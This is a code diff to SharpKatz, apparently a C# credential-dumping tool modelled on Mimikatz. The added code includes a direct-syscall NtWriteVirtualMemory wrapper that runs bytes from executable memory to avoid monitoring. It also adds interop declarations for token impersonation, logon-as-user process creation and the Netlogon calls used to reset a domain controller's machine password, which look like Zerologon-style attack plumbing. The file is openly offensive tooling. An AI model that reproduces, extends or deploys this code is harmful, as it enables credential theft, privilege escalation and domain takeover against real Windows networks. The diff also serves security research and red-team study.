@@ -153,6 +153,25 @@ namespace SharpKatz.Win32
 
         }
 
+        public static NTSTATUS NtWriteVirtualMemory10(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
+        {
+            byte[] syscall = bZwWriteVirtualMemory10;
+
+            GCHandle pinnedArray = GCHandle.Alloc(syscall, GCHandleType.Pinned);
+            IntPtr memoryAddress = pinnedArray.AddrOfPinnedObject();
+
+            if (!Natives.VirtualProtect(memoryAddress,
+                (UIntPtr)syscall.Length, memoryPtrotection, out uint oldprotect))
+            {
+                throw new Win32Exception();
+            }
+
+            Delegates.ZwWriteVirtualMemory myAssemblyFunction = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.ZwWriteVirtualMemory));
+
+            return (NTSTATUS)myAssemblyFunction(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
+
+        }
+
         public static NTSTATUS NtAllocateVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
         {
             byte[] syscall = bNtAllocateVirtualMemory10;
@@ -212,6 +231,10 @@ namespace SharpKatz.Win32
 
             [SuppressUnmanagedCodeSecurity]
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate int ZwWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);
 
             [SuppressUnmanagedCodeSecurity]
@@ -234,6 +257,10 @@ namespace SharpKatz.Win32
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate bool RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
 
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool RtlInitString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPStr)] string SourceString);
+            
             [SuppressUnmanagedCodeSecurity]
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate bool OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken);
@@ -336,6 +363,10 @@ namespace SharpKatz.Win32
 
             [SuppressUnmanagedCodeSecurity]
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate int RpcEpResolveBinding(IntPtr Binding, IntPtr IfSpec);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate int RtlDecryptDES2blocks1DWORD(byte[] data, ref UInt32 key, IntPtr output);
 
             [SuppressUnmanagedCodeSecurity]
@@ -380,6 +411,10 @@ namespace SharpKatz.Win32
 
             [SuppressUnmanagedCodeSecurity]
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate int BCryptEncrypt(SafeBCryptKeyHandle hKey, IntPtr pbInput, int cbInput, IntPtr pPaddingInfo, IntPtr pbIV, int cbIV, IntPtr pbOutput, int cbOutput, out int pcbResult, int dwFlags);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate IntPtr ASN1_CreateModule(uint nVersion, uint eRule, uint dwFlags, uint cPDU, IntPtr[] apfnEncoder, IntPtr[] apfnDecoder, IntPtr[] apfnFreeMemory, int[] acbStructSize, uint nModuleName);
 
             [SuppressUnmanagedCodeSecurity]
@@ -409,6 +444,50 @@ namespace SharpKatz.Win32
             [SuppressUnmanagedCodeSecurity]
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
             public delegate void ASN1_CloseModule(IntPtr pModule);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+            public delegate bool CreateProcessWithLogonW(string userName, string domain, string password, LogonFlags dwLogonFlags, string applicationName, string commandLine, CreationFlags dwCreationFlags, uint environment, string currentDirectory, ref STARTUPINFO startupInfo, out PROCESS_INFORMATION processInformation);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpTokenAttributes, int ImpersonationLevel, int TokenType, ref IntPtr phNewToken);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool SetThreadToken(IntPtr pHandle, IntPtr hToken);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate void NtResumeProcess(IntPtr hProcess);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint NtTerminateProcess(IntPtr hProcess, uint uExitCode);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+            public delegate uint NetrServerReqChallenge(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr ComputerName, IntPtr ClientChallenge, out NETLOGON_CREDENTIAL ServerChallenge);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+            public delegate uint NetrServerAuthenticate3(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr AccountName, NETLOGON_SECURE_CHANNEL_TYPE SecoureChannelType, IntPtr ComputerName, IntPtr ClientChallenge, out NETLOGON_CREDENTIAL ServerChallenge, out uint NegotiateFlags, out uint AccountRid);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+            public delegate uint NetServerPasswordSet2(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, IntPtr ComputerName, IntPtr Authenticator, IntPtr ReturnAuthenticator, IntPtr ClearNewPassword);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool LogonUser(string pszUserName, string pszDomain, string pszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+            [SuppressUnmanagedCodeSecurity]
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool RevertToSelf();
         }
     }
 }
